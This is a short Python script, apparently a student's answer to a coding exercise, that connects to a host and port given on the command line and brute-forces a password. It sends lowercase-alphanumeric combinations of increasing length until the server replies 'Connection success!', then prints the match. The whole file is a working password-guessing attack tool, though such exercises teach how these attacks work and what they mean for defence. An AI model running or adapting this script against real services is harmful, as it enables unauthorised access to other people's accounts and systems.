# write your code here

import sys
import socket
import itertools
args = sys.argv

# hostname, port, message = args[1], int(args[2]), args[3]
hostname, port = args[1], int(args[2])

new_socket = socket.socket()

address = hostname, port
new_socket.connect(address)

letters = list(map(lambda x: chr(x), list(range(ord('a'), ord('z') + 1))))
numbers = list(map(lambda x: str(x), list(range(0, 10))))
flag = 0
alphanumeric = letters + numbers

for x in range(1, len(alphanumeric) + 1):
    # password_gen = itertools.combinations_with_replacement(alphanumeric, x)
    for item in itertools.combinations_with_replacement(alphanumeric, x):
        password = "".join(item)
        password = password.encode('utf-8')
        new_socket.send(password)
        response = new_socket.recv(1024)
        response = response.decode()
        if response == "Connection success!":
            flag = 1
            print(password.decode())
            break
    if flag:
        break


new_socket.close()
